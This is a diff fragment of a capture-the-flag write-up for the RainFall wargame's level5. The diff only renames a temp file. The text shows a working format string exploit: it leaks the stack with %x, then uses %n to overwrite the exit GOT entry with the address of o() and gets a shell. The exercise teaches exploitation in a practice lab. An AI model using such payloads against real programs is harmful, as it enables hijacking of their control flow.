@@ -65,8 +65,8 @@ End of assembler dump.
 We can see 3 functions ```main(), n(), o()```. ```n()``` function gets standard input by ```fgets()``` and ```printf()``` without formatter. ```o()``` function have ```system()``` call, but its called by anywhere. \
 We will be try same things like previous level, but now we have to call function ```o()```.
 ```sh
-level5@RainFall:~$ python -c 'print "BBBB" + " %x" * 10' > /tmp/exploit4
-level5@RainFall:~$ cat /tmp/exploit4 | ./level5
+level5@RainFall:~$ python -c 'print "BBBB" + " %x" * 10' > /tmp/exploit5
+level5@RainFall:~$ cat /tmp/exploit5 | ./level5
 BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078
 level5@RainFall:~$ 
 ```
@@ -91,8 +91,8 @@ The start address of function ```o()``` is 0x80484a4, in decimal 134513828.
 original exit address + o() start address - 4 + %4$n
 ```
 ```sh
-level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit4
-level5@RainFall:~$ cat /tmp/exploit4 - | ./level5
+level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
+level5@RainFall:~$ cat /tmp/exploit5 - | ./level5
 ...
 whoami
 level6
